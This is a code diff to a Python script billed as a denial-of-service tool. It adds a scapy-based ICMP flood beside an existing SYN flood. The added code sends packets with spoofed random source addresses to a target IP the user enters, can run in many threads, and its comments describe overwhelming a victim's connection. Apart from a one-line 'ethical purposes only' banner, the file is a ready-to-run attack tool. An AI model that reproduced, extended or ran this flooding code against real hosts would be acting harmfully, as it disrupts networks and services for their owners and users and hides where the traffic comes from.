@@ -3,10 +3,12 @@ import os
 import random
 import threading
 import scapy.all
-from scapy.layers.inet import IP, TCP
+from scapy.layers.inet import IP, TCP, ICMP
 import time
 import subprocess
-subprocess.Popen(["vlc", "--intf", "dummy", "--no-video", "Maniacs of Noise - Firing Up V2.00.mp3"])
+
+from scapy.sendrecv import sr
+
 os.system("clear")
 #cool ascii art :3
 print(r"▓█████▄ ▓█████▄  ▒█████    ██████          ██▀███  "+"\n"
@@ -17,7 +19,7 @@ print(r"▓█████▄ ▓█████▄  ▒█████    █�
       r" ▒▒▓  ▒  ▒▒▓  ▒ ░ ▒░▒░▒░ ▒ ▒▓▒ ▒ ░        ░ ▒▓ ░▒▓░"+"\n"
       r" ░S▒YN▒TH░E▒Si▒ZE ░ ▒ ▒░ ░ ░▒  ░ ░          ░▒ ░ ▒░"+"\n"
       r" ░ ░  ░  ░ ░  ░ ░ ░D░E▒HU░MA░Ni░ZE          ░░   ░ "+"\n"
-      r"   ░       ░        ░ ░        ░    version 1.0.0"+"\n"
+      r"   ░       ░        ░ ░        ░    version 0.0.2"+"\n"
       r"a dead simple distributed denial-of-service tool"+"\n"
       r"by WIL_FU_"+"\n"
       r"in case you skids didn't get the memo, this is for ETHICAL PURPOSES ONLY"+"\n"
@@ -101,13 +103,76 @@ def syn_flood():
         print("[*] SYN FLOOD END")
     #flooding chosen port of chosen IP with SYN packets until the victim's connection shits itself
     send_syn_packet(ip, int(port), int(packets))
+def send_icmp_packet(ip, packets):
+    total = 0
+    for x in range(0, int(packets)):
+        s_port = random.randint(1000,9000)
+        seq = random.randint(1000,9000)
+        window = random.randint(1000,9000)
+        IP_packet = IP()
+        IP_packet.src = random_ip()
+        IP_packet.dst = ip
 
+        #creating SYN packet, random port, random amount of data, everything randomized
+        #TCP_packet = TCP()
+        #TCP_packet.sport = s_port
+        #TCP_packet.dport = int(port)
+        #TCP_packet.seq = seq
+        #TCP_packet.flags = "S"
+        #TCP_packet.window = window
+        #packets will be created and sent until amount of packets reached
+        scapy.all.send(IP_packet/ICMP(), verbose=1)
+        #total packets sent increments, will be printed at the end of the attack, literally only used for that purpose
+        total += 1
+        os.system("clear")
+        print("[*] ICMP FLOOD BEGIN")
+        s = "-----" + "ICMP FLOOD" + "-----"
+        outputAsListItem("", s)
+        outputAsListItem(f"IP ADDRESS (DESTINATION): {IP_packet.dst}", s)
+        outputAsListItem(f"IP ADDRESS ('SENT FROM'): {IP_packet.src}", s)
+        closeList(s)
+        print("[*] PACKETS SENT: " + str(total))
+def icmp_flood():
+    ip=input("ENTER IP ADDRESS: ")
+    os.system("clear")
+    s = "-----" + "ICMP FLOOD CONFIG" + "-----"
+    print(s)
+    outputAsListItem("", s)
+    outputAsListItem(f"IP ADDRESS: {ip}", s)
+    closeList(s)
+    os.system("clear")
+    print(s)
+    outputAsListItem("", s)
+    outputAsListItem(f"IP ADDRESS: {ip}", s)
+    closeList(s)
+    packets = input("ENTER AMOUNT OF PACKETS: ")
+    os.system("clear")
+    isMultithreaded = input("ENTER 1 FOR MULTITHREADED ATTACK (ALLOWS MULTIPLE ATTACKS TO RUN CONCURRENTLY), OR 0 FOR NORMAL ATTACK: ")
+    if int(isMultithreaded) == 0:
+        os.system("clear")
+        print("[*] ICMP FLOOD BEGIN")
+        send_icmp_packet(ip, int(packets))
+        print("[*] ICMP FLOOD END")
+    elif int(isMultithreaded) == 1:
+        threadCount = int(input("ENTER THREAD COUNT: "))
+        os.system("clear")
+        threads = []
+        for x in range(0, threadCount):
+            thread = threading.Thread(target=send_icmp_packet, args=(ip, int(packets)))
+            threads.append(thread)
+        for thread in threads:
+            thread.start()
+        for thread in threads:
+            thread.join()
+        print("[*] ICMP FLOOD END")
+    #flooding chosen port of chosen IP with SYN packets until the victim's connection shits itself
+    send_icmp_packet(ip, int(packets))
 def attack_type():
     os.system("clear")
     print("----ATTACK MENU----")
     print("|                 |")
     print("| [1]-SYN_FLOOD_  |")
-    print("| [2]-ICMP_FLOOD_  |")
+    print("| [2]-ICMP_FLOOD_ |")
     print("| MORE 2 COME     |")
     print("|                 |")
     print("-------------------")
@@ -145,6 +210,10 @@ def attack_setup(attacktype):
         closeList(s)
         syn_flood()
     if attackTypes[attacktype - 1] == "ICMP FLOOD":
+        outputAsListItem("", s)
+        outputAsListItem("IP ADDRESS: ", s)
+        closeList(s)
+        icmp_flood()
 
 #program begin
 attack_setup(attack_type())
